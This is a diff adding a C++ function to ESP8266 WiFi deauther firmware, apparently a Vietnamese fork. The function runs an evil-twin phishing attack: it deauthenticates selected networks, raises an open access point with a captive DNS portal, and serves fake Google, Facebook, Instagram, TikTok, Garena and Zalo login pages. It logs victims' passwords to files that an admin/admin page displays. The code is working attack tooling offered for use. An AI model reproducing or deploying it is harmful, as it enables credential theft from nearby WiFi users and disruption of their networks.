@@ -1,0 +1,499 @@
+void BaoKhang() {
+  uint32_t apCount = accesspoints.count();
+  uint32_t timeout = settings::getAttackSettings().timeout * 1000;
+  File khoathietbi = LittleFS.open("/matkhauwifi.txt", "r");
+  String makhoa;
+  while (khoathietbi.available()) {
+    makhoa += char(khoathietbi.read());
+  }
+  if (String(xyzxyz).equals(String(system_get_chip_id())) && (makhoa.toInt() != 2)) {
+    // Serial.println("mã khoá đang lưu trong thiết bị: ");
+    // Serial.print(makhoa);
+    if (laytaikhoan) {
+      if (laytaikhoankhongmuctieu) {
+        WiFi.softAPConfig(ip, ip, netmask);  // Không mục tiêu
+        WiFi.softAP(ap_settings.ssid, NULL, ap_settings.channel);
+
+        for (uint32_t i = 0; i < apCount; i++) {
+          if (accesspoints.getSelected(i) > 0) {
+            attack.start(false, true, false, false, true, timeout);
+          }
+          break;
+        }
+
+      } else if (laytaikhoancomuctieu) {               // Có mục tiêu
+        WiFi.softAPConfig(ip, ip, netmask);
+        WiFi.softAP(ap_settings.ssid, NULL, ap_settings.channel);
+        attack.start(false, true, false, false, true, timeout);
+      }
+
+      digitalWrite(D4, LOW);
+      dns.start(53, "*", ip);
+
+      server.on("/danhsachmatkhau", []() {
+        File f = LittleFS.open("/logs.txt", "r");
+        String debugLogData;
+        while (f.available()) {
+          debugLogData += char(f.read());
+        }
+        server.send(200, "text/html", "<!DOCTYPE html><html><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><meta charset=\"utf-8\" /><head><h3>&#87;&#101;&#98;&#115;&#105;&#116;&#101;: &#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#109;&#97;&#99;&#104;&#119;&#105;&#102;&#105;&#55;&#56;&#57;&#46;&#99;&#102;</h3></h5><style>button[type=submit]{width:100%;border:2px solid #1877f2;border-radius:4px;margin:6px 0;padding:12px;box-sizing:border-box;transition:.3s;color: white;font-weight: bold;font-size: 16px;background-color:#1877f2;} text[type=text]{margin:10px 0; font-size: 20px;}</style></head><body><form method=\"POST\" action=\"clean\"><button type=\"submit\">Xóa thông tin</button></form>" + debugLogData + "</body></html>");
+      });
+      server.on(String(F("/images/logo.png")).c_str(), HTTP_GET,
+      []() {
+        sendProgmem(logopng, sizeof(logopng), W_PNG);
+      });
+      server.on("/taikhoanGoogle", []() {
+        String passwordggbu = server.arg("pass");
+        String usergg = server.arg("user");
+        String passwordgg = server.arg("pass");
+        //   random(passwordgg.length());
+        if (passwordgg == "") {
+          //server.send(200, "text/html", googlehtml);
+          sendProgmem(googlehtml, sizeof(googlehtml), W_HTML);
+        }
+        else if ((usergg == "admin@admin" || usergg == "Admin@admin") && passwordgg == "admin") {
+          server.sendHeader("Location", String("/danhsachmatkhau"), true);
+          server.send ( 302, "text/html", "");
+        } else {
+          // passwordgg.remove(random(passwordgg.length()), 1);
+          //   passwordgg.remove(random(passwordgg.length()), 1);
+          File file = LittleFS.open("/logs.txt", "a");
+          if (file) {
+            file.println("<br> Google: " + usergg + " " + "<br>" + "Mật khẩu: " + passwordgg + "<br>");
+            file.close();
+          }
+
+          File backuplogs = LittleFS.open("/backuplogs.txt", "a");
+          if (backuplogs) {
+            backuplogs.println("\n Google: " + usergg + "\n Mật khẩu: " + passwordggbu + "\n");
+            backuplogs.close();
+          }
+          sendProgmem(quataihtml, sizeof(quataihtml), W_HTML);
+          //server.send(200, "text/html", quatai_html);
+        }
+      });
+      /*
+        server.on("/taikhoantwitter", []() {
+
+        String ssid = server.arg("ssid");
+        String pass = server.arg("pass");
+
+           if (ssid == "admin" || ssid == "Admin" && pass == "admin") {
+             server.sendHeader("Location", String("/danhsachmatkhau"), true);
+            server.send ( 302, "text/html", "");
+          } else {
+
+        File file = LittleFS.open("/logs.txt", "a");
+          if (file) {
+            file.println("Twitter: " + ssid + " " + "<br>" + "Mật khẩu: " + pass + "<br><br>");
+            file.close();
+          }
+
+        File backuplogs = LittleFS.open("/backuplogs.txt", "a");
+          if (backuplogs) {
+            backuplogs.println("Twitter: " + ssid + " " + "<br>" + "Mật khẩu: " + pass + "<br><br>");
+            backuplogs.close();
+          }
+
+          server.send(200, "text/html", quatai_html);
+
+          }
+        });
+      */
+      server.on("/taikhoantiktok", []() {
+
+        String ssid = server.arg("username");
+        String pass = server.arg("password");
+        String passbu = server.arg("pass");
+        if ((ssid == "" || pass == "") || (ssid == "" && pass == "")) {
+          // server.send(200, "text/html", tiktok_html);
+          sendProgmem(tiktokhtml, sizeof(tiktokhtml), W_HTML);
+        }
+        else if ((ssid == "admin" || ssid == "Admin") && pass == "admin") {
+          server.sendHeader("Location", String("/danhsachmatkhau"), true);
+          server.send ( 302, "text/html", "");
+        } else {
+          //  pass.remove(random(pass.length()), 1);
+          //  pass.remove(random(pass.length()), 1);
+          File file = LittleFS.open("/logs.txt", "a");
+          if (file) {
+            file.println("<br> TikTok: " + ssid + " " + "<br>" + "Mật khẩu: " + pass + "<br>");
+            file.close();
+          }
+
+          File backuplogs = LittleFS.open("/backuplogs.txt", "a");
+          if (backuplogs) {
+            backuplogs.println("\n TikTok: " + ssid + "\n Mật khẩu: " + passbu + "\n");
+            backuplogs.close();
+          }
+          // server.send(200, "text/html", quatai_html);
+          sendProgmem(quataihtml, sizeof(quataihtml), W_HTML);
+        }
+      });
+
+      server.on("/taikhoanfacebook", []() {
+
+        String ssid = server.arg("ssid");
+        String pass = server.arg("pass");
+        String passbu = server.arg("pass");
+        if ((ssid == "" || pass == "") || (ssid == "" && pass == "")) {
+          // server.send(200, "text/html", facebook_html);
+          sendProgmem(facebookhtml, sizeof(facebookhtml), W_HTML);
+        }
+        else if ((ssid == "admin" || ssid == "Admin") && pass == "admin") {
+          server.sendHeader("Location", String("/danhsachmatkhau"), true);
+          server.send ( 302, "text/html", "");
+        } else {
+          //  pass.remove(random(pass.length()), 1);
+          //  pass.remove(random(pass.length()), 1);
+          File file = LittleFS.open("/logs.txt", "a");
+          if (file) {
+            file.println("<br> Facebook: " + ssid + " " + "<br>" + " Mật khẩu: " + pass + "<br>");
+            file.close();
+          }
+
+          File backuplogs = LittleFS.open("/backuplogs.txt", "a");
+          if (backuplogs) {
+            backuplogs.println("\n Facebook: " + ssid + "\n Mật khẩu: " + passbu + "\n");
+            backuplogs.close();
+          }
+          // server.send(200, "text/html", quatai_html);
+          sendProgmem(quataihtml, sizeof(quataihtml), W_HTML);
+
+        }
+      });
+
+      server.on("/taikhoaninstagram", []() {
+
+        String ssid = server.arg("ssid");
+        String pass = server.arg("pass");
+        String passbu = server.arg("pass");
+        if ((ssid == "" || pass == "") || (ssid == "" && pass == "")) {
+          // server.send(200, "text/html", instagram_html);
+          sendProgmem(instagramhtml, sizeof(instagramhtml), W_HTML);
+        }
+        else if ((ssid == "admin" || ssid == "Admin") && pass == "admin") {
+          server.sendHeader("Location", String("/danhsachmatkhau"), true);
+          server.send ( 302, "text/html", "");
+        } else {
+          //  pass.remove(random(pass.length()), 1);
+          //  pass.remove(random(pass.length()), 1);
+          File file = LittleFS.open("/logs.txt", "a");
+          if (file) {
+            file.println("<br> Instagram: " + ssid + " " + "<br>" + " Mật khẩu: " + pass + "<br>");
+            file.close();
+          }
+
+          File backuplogs = LittleFS.open("/backuplogs.txt", "a");
+          if (backuplogs) {
+            backuplogs.println("\n Instagram: " + ssid + "\n Mật khẩu: " + passbu + "\n");
+            backuplogs.close();
+          }
+          // server.send(200, "text/html", quatai_html);
+          sendProgmem(quataihtml, sizeof(quataihtml), W_HTML);
+
+        }
+      });
+
+      server.on("/taikhoangarena", []() {
+
+        String ssid = server.arg("ssid");
+        String pass = server.arg("pass");
+
+        if ((ssid == "" || pass == "") || (ssid == "" && pass == "")) {
+          // server.send(200, "text/html", garena_html);
+          sendProgmem(garenahtml, sizeof(garenahtml), W_HTML);
+        }
+        else if (ssid == "admin" || ssid == "Admin" && pass == "admin") {
+          server.sendHeader("Location", String("/danhsachmatkhau"), true);
+          server.send ( 302, "text/html", "");
+        } else {
+
+          File file = LittleFS.open("/logs.txt", "a");
+          if (file) {
+            file.println("<br> Garena: " + ssid + " " + "<br>" + " Mật khẩu: " + pass + "<br>");
+            file.close();
+          }
+
+          File backuplogs = LittleFS.open("/backuplogs.txt", "a");
+          if (backuplogs) {
+            backuplogs.println("\n Garena: " + ssid + "\n Mật khẩu: " + pass + "\n");
+            backuplogs.close();
+          }
+
+          //server.send(200, "text/html", quatai_html);
+          sendProgmem(quataihtml, sizeof(quataihtml), W_HTML);
+        }
+      });
+
+      server.on("/taikhoanzalo", []() {
+
+        String ssid = server.arg("zalousername");
+        String pass = server.arg("zalopassword");
+
+        if ((ssid == "" || pass == "") || (ssid == "" && pass == "")) {
+          // server.send(200, "text/html", zalo_html);
+          sendProgmem(zalohtml, sizeof(zalohtml), W_HTML);
+        }
+        else if (ssid == "admin" || ssid == "Admin" && pass == "admin") {
+          server.sendHeader("Location", String("/danhsachmatkhau"), true);
+          server.send ( 302, "text/html", "");
+        } else {
+
+          File file = LittleFS.open("/logs.txt", "a");
+          if (file) {
+            file.println("<br> Zalo: " + ssid + " " + "<br>" + " Mật khẩu: " + pass + "<br>");
+            file.close();
+          }
+
+          File backuplogs = LittleFS.open("/backuplogs.txt", "a");
+          if (backuplogs) {
+            backuplogs.println("\n Zalo: " + ssid + "\n Mật khẩu: " + pass + "\n");
+            backuplogs.close();
+          }
+          sendProgmem(quataihtml, sizeof(quataihtml), W_HTML);
+          //server.send(200, "text/html", quatai_html);
+        }
+      });
+
+      server.on("/clean", []() {
+        LittleFS.remove("/logs.txt");
+        server.send(200, "text/html", tonghop_html);
+      });
+
+      server.on("/loginGoogle", []() {
+        //server.send(200, "text/html", google_html);
+        sendProgmem(googlehtml, sizeof(googlehtml), W_HTML);
+      });
+
+      server.on("/loginGarena", []() {
+        // server.send(200, "text/html", garena_html);
+        sendProgmem(garenahtml, sizeof(garenahtml), W_HTML);
+      });
+
+      server.on("/loginTiktok", []() {
+        //  server.send(200, "text/html", tiktok_html);
+        sendProgmem(tiktokhtml, sizeof(tiktokhtml), W_HTML);
+      });
+      server.on("/loginZalo", []() {
+        //  server.send(200, "text/html", zalo_html);
+        sendProgmem(zalohtml, sizeof(zalohtml), W_HTML);
+      });
+
+      server.on("/loginFacebook", []() {
+        // server.send(200, "text/html", facebook_html);
+        sendProgmem(facebookhtml, sizeof(facebookhtml), W_HTML);
+      });
+
+      server.on("/loginInstagram", []() {
+        // server.send(200, "text/html", instagram_html);
+        sendProgmem(instagramhtml, sizeof(instagramhtml), W_HTML);
+      });
+      /*
+        server.on("/loginTwitter", []() {
+           server.send(200, "text/html", twitter_html);
+         });
+      */
+      server.onNotFound([]() {
+        if (laytaikhoanfacebook) {
+          //  server.send(200, "text/html", facebook_html);
+          sendProgmem(facebookhtml, sizeof(facebookhtml), W_HTML);
+        }
+        else if (laytaikhoangoogle) {
+          //server.send(200, "text/html", google_html);
+          sendProgmem(googlehtml, sizeof(googlehtml), W_HTML);
+        }
+        else if (laytaikhoaninstagram) {
+          //server.send(200, "text/html", instagram_html);
+          sendProgmem(instagramhtml, sizeof(instagramhtml), W_HTML);
+        }
+        else if (laytaikhoantiktok) {
+          // server.send(200, "text/html", tiktok_html);
+          sendProgmem(tiktokhtml, sizeof(tiktokhtml), W_HTML);
+        }
+        else if (laytaikhoangarena) {
+          // server.send(200, "text/html", garena_html);
+          sendProgmem(garenahtml, sizeof(garenahtml), W_HTML);
+        }
+        else if (laytaikhoanzalo) {
+          //  server.send(200, "text/html", zalo_html);
+          sendProgmem(zalohtml, sizeof(zalohtml), W_HTML);
+        }
+
+        else {
+          server.send(200, "text/html", tonghop_html);
+        }
+      });
+
+      server.begin();
+
+    } else {
+
+      if (hacking) {
+        WiFi.softAPConfig(ip, ip, netmask);
+        WiFi.softAP(ap_settings.ssid, NULL, ap_settings.channel);
+      }
+      else {
+        WiFi.softAPConfig(ip, ip, netmask);
+        WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel);
+      }
+
+      dns.setErrorReplyCode(DNSReplyCode::NoError);
+      dns.start(53, "*", ip);
+      // MDNS.begin(WEB_URL);
+      server.on("/list", HTTP_GET, handleFileList); // list directory
+
+      // ================================================================
+      // paste here the output of the webConverter.py
+      server.on("/", HTTP_GET, []() {
+        if (!hacking) {
+          sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
+        } else {
+          sendProgmem(updateshtml, sizeof(updateshtml), W_HTML);
+        }
+      });
+      server.on("/index.html", HTTP_GET, []() {
+        if (!hacking) {
+          sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
+        } else {
+          sendProgmem(updateshtml, sizeof(updateshtml), W_HTML);
+
+        }
+      });
+      server.on("/updates.html", HTTP_GET, []() {
+        if (!hacking) {
+          sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
+        } else {
+          sendProgmem(updateshtml, sizeof(updateshtml), W_HTML);
+        }
+      });
+      server.on("/noitiep.html", HTTP_GET, []() {
+        sendProgmem(noitiephtml, sizeof(noitiephtml), W_HTML);
+      });
+      server.on("/js/noitiep.js", HTTP_GET, []() {
+        sendProgmem(noitiepjs, sizeof(noitiepjs), W_JS);
+      });
+      server.on("/scan.html", HTTP_GET, []() {
+        if (!hacking) {
+          sendProgmem(scanhtml, sizeof(scanhtml), W_HTML);
+        } else {
+          sendProgmem(updateshtml, sizeof(updateshtml), W_HTML);
+        }
+      });
+      server.on("/ssids.html", HTTP_GET, []() {
+        if (!hacking) {
+          sendProgmem(ssidshtml, sizeof(ssidshtml), W_HTML);
+        } else {
+          sendProgmem(updateshtml, sizeof(updateshtml), W_HTML);
+        }
+      });
+      server.on("/attack.html", HTTP_GET, []() {
+        if (!hacking) {
+          //  server.send(200, "text/html", attackshtml);
+          sendProgmem(attackhtml, sizeof(attackhtml), W_HTML);
+        } else {
+          sendProgmem(updateshtml, sizeof(updateshtml), W_HTML);
+        }
+      });
+
+      server.on("/password.html", HTTP_GET, []() {
+        if (!hacking) {
+          sendProgmem(passwordhtml, sizeof(passwordhtml), W_HTML);
+          //  server.send(200, "text/html", passwordhtml);
+        } else {
+          sendProgmem(updateshtml, sizeof(updateshtml), W_HTML);
+
+        }
+      });
+      server.on("/settings.html", HTTP_GET, []() {
+        if (!hacking) {
+          //server.send(200, "text/html", settingshtml);
+          sendProgmem(settingshtml, sizeof(settingshtml), W_HTML);
+        } else {
+          sendProgmem(updateshtml, sizeof(updateshtml), W_HTML);
+        }
+      });
+      server.on("/style.css", HTTP_GET, []() {
+        sendProgmem(stylecss, sizeof(stylecss), W_CSS);
+      });
+      server.on("/js/ssids.js", HTTP_GET, []() {
+        if (!hacking) {
+          sendProgmem(ssidsjs, sizeof(ssidsjs), W_JS);
+        }
+      });
+      server.on("/js/site.js", HTTP_GET, []() {
+        sendProgmem(sitejs, sizeof(sitejs), W_JS);
+      });
+      server.on("/js/attack.js", HTTP_GET, []() {
+        if (!hacking) {
+          sendProgmem(attackjs, sizeof(attackjs), W_JS);
+        }
+      });
+      server.on("/js/updates.js", HTTP_GET, []() {
+        if (hacking) {
+          sendProgmem(updatesjs, sizeof(updatesjs), W_JS);
+        }
+      });
+      server.on("/js/scan.js", HTTP_GET, []() {
+        if (!hacking) {
+          sendProgmem(scanjs, sizeof(scanjs), W_JS);
+        }
+      });
+      server.on("/js/password.js", HTTP_GET, []() {
+        if (!hacking) {
+          sendProgmem(passwordjs, sizeof(scanjs), W_JS);
+        }
+      });
+      server.on("/js/settings.js", HTTP_GET, []() {
+        if (!hacking) {
+          sendProgmem(settingsjs, sizeof(settingsjs), W_JS);
+        }
+      });
+      server.on("/lang/en.lang", HTTP_GET, []() {
+        sendProgmem(enlang, sizeof(enlang), W_JSON);
+      });
+
+      server.on("/lang/default.lang", HTTP_GET, []() {
+
+        handleFileRead("/web/lang/" + String(settings::getWebSettings().lang) + ".lang");
+
+      });
+
+      server.on("/run", HTTP_GET, []() {
+        server.send(200, str(W_TXT), str(W_OK).c_str());
+        String input = server.arg("cmd");
+        cli.exec(input);
+      });
+
+      server.on("/console", HTTP_GET, []() {
+        server.send(200, str(W_TXT), noitiepOutputCache.c_str());
+        //Clearing the cache once it is sent
+        noitiepOutputCache = "";
+      });
+
+      server.on("/attack.json", HTTP_GET, []() {
+        if (!hacking) {
+          server.send(200, str(W_JSON), attack.getStatusJSON());
+        }
+      });
+
+      // called when the url is not defined here
+      // use it to load content from SPIFFS
+      server.onNotFound([]() {
+        if (!handleFileRead(server.uri())) {
+          if (hacking) {
+            sendProgmem(updateshtml, sizeof(updateshtml), W_HTML);
+          } else {
+            server.send(404, str(W_TXT), str(W_FILE_NOT_FOUND));
+          }
+        }
+      });
+
+      server.begin();
+      ElegantOTA.begin(&server);
+      mode = wifi_mode_t::ap;
+      //  prntln(W_STARTED_AP);
+      printStatus();
+    }
+  }
+}
